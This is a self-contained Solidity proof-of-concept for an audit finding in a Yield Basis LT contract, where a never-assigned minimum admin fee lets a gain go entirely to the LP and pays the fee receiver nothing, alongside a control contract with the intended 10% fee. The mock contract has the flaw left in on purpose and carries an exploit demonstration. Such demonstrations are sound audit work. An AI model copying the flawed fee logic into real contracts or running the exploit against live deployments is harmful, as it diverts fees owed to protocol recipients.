// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    Yield Basis LT — min_admin_fee is never assigned (Quantstamp, #62011)

    SYNTHETIC, cheatcode-free. The admin-fee curve from LT._calculate_values:

        f = 1e18 - (1e18 - min_admin_fee) * sqrt(1e36 - staked * 1e36 / supply) / 1e18

    min_admin_fee has no constructor write and no setter, so it stays 0.
    At stake ratio 0 the fee is 0 instead of the 10% floor. A 1000-token
    gain pays the fee receiver nothing; the LP keeps the 100 that should
    have been minted to veYB. The control sets min_admin_fee to 0.1e18 and
    the same gain pays 100. One transaction. No warp.
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract LT {
    Token public immutable token;
    address public immutable feeReceiver;
    uint256 public minAdminFee;
    uint256 public feePaid;

    constructor(Token t, address feeTo, uint256 minimum) {
        token = t;
        feeReceiver = feeTo;
        if (minimum > 0) minAdminFee = minimum;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _adminFee(uint256 staked, uint256 supply) internal view returns (uint256) {
        uint256 inside = 1e36 - (staked * 1e36) / supply;
        uint256 root = _sqrt(inside);
        // @> VULN: minAdminFee is never assigned on the real LT, so this floor is 0
        return 1e18 - (1e18 - minAdminFee) * root / 1e18;
    }

    function charge(uint256 gain, uint256 staked, uint256 supply) external returns (uint256 fee) {
        uint256 f = _adminFee(staked, supply);
        fee = gain * f / 1e18;
        feePaid = fee;
        if (fee > 0) {
            require(token.transfer(feeReceiver, fee), "fee");
        }
    }

    function sweep(address to) external {
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) require(token.transfer(to, bal), "sweep");
    }
}

contract Exploit {
    Token public token; // CREATE 1
    LT public lt; // CREATE 2
    address public constant FEE_TO = 0x7777777777777777777777777777777777777777;

    uint256 public feePaid;
    uint256 public lpGot;
    uint256 public constant GAIN = 1000 ether;

    constructor() {
        token = new Token();
        lt = new LT(token, FEE_TO, 0);
    }

    function run() external {
        token.mint(address(lt), GAIN);
        lt.charge(GAIN, 0, 1);
        feePaid = lt.feePaid();
        lt.sweep(address(this));
        lpGot = token.balanceOf(address(this));
        require(feePaid == 0, "no fee");
        require(token.balanceOf(FEE_TO) == 0, "receiver got 0");
        require(lpGot == GAIN, "lp kept 1000");
    }
}

contract ControlExploit {
    Token public token;
    LT public lt;
    address public constant FEE_TO = 0x7777777777777777777777777777777777777777;

    uint256 public feePaid;
    uint256 public lpGot;
    uint256 public constant GAIN = 1000 ether;

    constructor() {
        token = new Token();
        lt = new LT(token, FEE_TO, 0.1 ether);
    }

    function run() external {
        token.mint(address(lt), GAIN);
        lt.charge(GAIN, 0, 1);
        feePaid = lt.feePaid();
        lt.sweep(address(this));
        lpGot = token.balanceOf(address(this));
        require(feePaid == 100 ether, "fee 100");
        require(token.balanceOf(FEE_TO) == 100 ether, "receiver 100");
        require(lpGot == 900 ether, "lp kept 900");
    }
}
